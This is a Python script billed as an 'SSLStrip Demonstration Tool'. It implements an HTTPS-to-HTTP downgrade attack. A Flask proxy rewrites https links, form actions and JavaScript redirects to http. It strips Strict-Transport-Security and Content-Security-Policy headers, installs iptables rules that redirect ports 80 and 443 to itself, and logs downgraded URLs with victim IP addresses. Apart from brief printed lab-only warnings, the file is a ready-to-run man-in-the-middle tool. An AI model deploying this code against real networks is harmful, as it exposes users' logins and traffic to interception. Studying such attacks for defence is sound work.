#!/usr/bin/env python3
"""
SSLStrip Demonstration Tool
Demonstrates HTTPS to HTTP downgrade attacks
"""

import argparse
import sys
import os
import threading
import signal
import subprocess
import time
from datetime import datetime
from colorama import init, Fore, Style
from flask import Flask, request, Response
import requests
import re

init(autoreset=True)

class SSLStripDemo:
    def __init__(self, interface, proxy_port=8080, verbose=False):
        self.interface = interface
        self.proxy_port = proxy_port
        self.verbose = verbose
        self.running = False
        self.app = Flask(__name__)
        self.stats = {
            'https_requests': 0,
            'http_downgrades': 0,
            'total_requests': 0,
            'downgraded_urls': [],
            'start_time': None
        }
        
        # Set up Flask routes
        self.setup_routes()
    
    def setup_routes(self):
        """Set up Flask proxy routes"""
        @self.app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE'])
        @self.app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
        def proxy_handler(path):
            return self.handle_request(path)
    
    def handle_request(self, path):
        """Handle proxied requests"""
        self.stats['total_requests'] += 1
        
        # Get the original host from Host header
        host = request.headers.get('Host', '')
        if not host:
            return "Bad Request: No Host header", 400
        
        # Determine if this was originally HTTPS
        original_scheme = 'https' if request.headers.get('X-Forwarded-Proto') == 'https' or request.is_secure else 'http'
        
        # Force HTTP for the upstream request (SSLStrip behavior)
        target_url = f"http://{host}/{path}"
        
        if original_scheme == 'https':
            self.stats['https_requests'] += 1
            self.stats['http_downgrades'] += 1
            self.stats['downgraded_urls'].append({
                'timestamp': datetime.now().isoformat(),
                'original_url': f"https://{host}/{path}",
                'downgraded_url': target_url,
                'client_ip': request.remote_addr
            })
            
            if self.verbose:
                print(f"{Fore.RED}[DOWNGRADE] HTTPS -> HTTP: {host}/{path}{Style.RESET_ALL}")
        
        try:
            # Forward the request
            if request.method == 'GET':
                response = requests.get(target_url, 
                                      headers=dict(request.headers),
                                      params=request.args,
                                      allow_redirects=False,
                                      timeout=10)
            elif request.method == 'POST':
                response = requests.post(target_url,
                                       headers=dict(request.headers),
                                       data=request.get_data(),
                                       allow_redirects=False,
                                       timeout=10)
            else:
                # Handle other methods
                response = requests.request(request.method,
                                          target_url,
                                          headers=dict(request.headers),
                                          data=request.get_data(),
                                          allow_redirects=False,
                                          timeout=10)
            
            # Process response content to strip HTTPS references
            content = response.content.decode('utf-8', errors='ignore')
            content = self.strip_https_from_content(content, host)
            
            # Create response
            flask_response = Response(content,
                                    status=response.status_code,
                                    headers=dict(response.headers))
            
            # Remove security headers that might interfere
            flask_response.headers.pop('Strict-Transport-Security', None)
            flask_response.headers.pop('Content-Security-Policy', None)
            
            if self.verbose:
                print(f"{Fore.BLUE}[PROXY] {request.method} {host}/{path} -> {response.status_code}{Style.RESET_ALL}")
            
            return flask_response
            
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[PROXY ERROR] {e}{Style.RESET_ALL}")
            return f"Proxy Error: {str(e)}", 500
    
    def strip_https_from_content(self, content, host):
        """Strip HTTPS references from content"""
        # Replace https:// with http://
        content = re.sub(r'https://', 'http://', content, flags=re.IGNORECASE)
        
        # Replace secure form actions
        content = re.sub(r'action="https://', 'action="http://', content, flags=re.IGNORECASE)
        
        # Replace secure links
        content = re.sub(r'href="https://', 'href="http://', content, flags=re.IGNORECASE)
        
        # Replace secure redirects in JavaScript
        content = re.sub(r"location\.href\s*=\s*['\"]https://", "location.href='http://", content, flags=re.IGNORECASE)
        
        return content
    
    def setup_iptables_redirect(self):
        """Set up iptables rules to redirect HTTP/HTTPS traffic"""
        try:
            # Redirect HTTP traffic (port 80) to proxy
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '80',
                '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
            ], check=True)
            
            # Redirect HTTPS traffic (port 443) to proxy  
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--dport', '443',
                '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
            ], check=True)
            
            print(f"{Fore.GREEN}[+] iptables rules configured for traffic redirection{Style.RESET_ALL}")
            
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[-] Error setting up iptables: {e}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] You may need to set up port redirection manually{Style.RESET_ALL}")
    
    def cleanup_iptables(self):
        """Clean up iptables rules"""
        try:
            # Remove HTTP redirect rule
            subprocess.run([
                'iptables', '-t', 'nat', '-D', 'PREROUTING',
                '-p', 'tcp', '--dport', '80',
                '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
            ], capture_output=True)
            
            # Remove HTTPS redirect rule
            subprocess.run([
                'iptables', '-t', 'nat', '-D', 'PREROUTING',
                '-p', 'tcp', '--dport', '443',
                '-j', 'REDIRECT', '--to-port', str(self.proxy_port)
            ], capture_output=True)
            
            print(f"{Fore.GREEN}[+] iptables rules cleaned up{Style.RESET_ALL}")
            
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Error cleaning up iptables: {e}{Style.RESET_ALL}")
    
    def start_proxy(self):
        """Start the proxy server"""
        try:
            print(f"{Fore.CYAN}[*] Starting SSLStrip proxy on port {self.proxy_port}...{Style.RESET_ALL}")
            
            # Disable Flask logging in non-verbose mode
            if not self.verbose:
                import logging
                log = logging.getLogger('werkzeug')
                log.setLevel(logging.ERROR)
            
            self.app.run(host='0.0.0.0', port=self.proxy_port, threaded=True, debug=False)
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error starting proxy: {e}{Style.RESET_ALL}")
    
    def save_logs(self):
        """Save SSLStrip logs"""
        log_file = f"sslstrip_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        import json
        log_data = {
            'statistics': self.stats,
            'configuration': {
                'interface': self.interface,
                'proxy_port': self.proxy_port
            }
        }
        
        try:
            with open(log_file, 'w') as f:
                json.dump(log_data, f, indent=2)
            print(f"{Fore.GREEN}[+] Logs saved to {log_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving logs: {e}{Style.RESET_ALL}")
    
    def print_statistics(self):
        """Print SSLStrip statistics"""
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}SSLSTRIP STATISTICS")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}Total Requests: {self.stats['total_requests']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}HTTPS Requests: {self.stats['https_requests']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}HTTP Downgrades: {self.stats['http_downgrades']}{Style.RESET_ALL}")
        
        if self.stats['start_time']:
            duration = (datetime.now() - self.stats['start_time']).total_seconds()
            print(f"{Fore.YELLOW}Runtime: {duration:.2f} seconds{Style.RESET_ALL}")
        
        if self.stats['downgraded_urls']:
            print(f"\n{Fore.CYAN}Recent Downgrades:{Style.RESET_ALL}")
            for entry in self.stats['downgraded_urls'][-5:]:  # Show last 5
                print(f"  {entry['timestamp']}: {entry['original_url']} -> HTTP")
    
    def run(self):
        """Main execution function"""
        print(f"{Fore.CYAN}{'='*50}")
        print(f"{Fore.CYAN}SSLSTRIP DEMONSTRATION")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        # Check if running as root
        if os.geteuid() != 0:
            print(f"{Fore.RED}[-] This script must be run as root (use sudo){Style.RESET_ALL}")
            sys.exit(1)
        
        print(f"{Fore.YELLOW}[!] WARNING: This tool demonstrates HTTPS downgrade attacks{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Modern browsers and HSTS significantly mitigate these attacks{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Use only in controlled lab environments{Style.RESET_ALL}")
        
        self.stats['start_time'] = datetime.now()
        
        # Set up signal handler for graceful exit
        def signal_handler(sig, frame):
            print(f"\n{Fore.YELLOW}[!] Interrupt received, stopping SSLStrip...{Style.RESET_ALL}")
            self.running = False
            self.cleanup_iptables()
            self.save_logs()
            self.print_statistics()
            sys.exit(0)
            
        signal.signal(signal.SIGINT, signal_handler)
        
        # Set up traffic redirection
        self.setup_iptables_redirect()
        
        print(f"{Fore.GREEN}[+] Press Ctrl+C to stop{Style.RESET_ALL}")
        
        # Start proxy
        try:
            self.running = True
            self.start_proxy()
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup_iptables()
            self.save_logs()
            self.print_statistics()

def main():
    parser = argparse.ArgumentParser(description='SSLStrip Demonstration Tool')
    parser.add_argument('-i', '--interface', required=True, help='Network interface')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Proxy port (default: 8080)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create and run SSLStrip demo
    sslstrip = SSLStripDemo(args.interface, args.port, args.verbose)
    sslstrip.run()

if __name__ == '__main__':
    main()
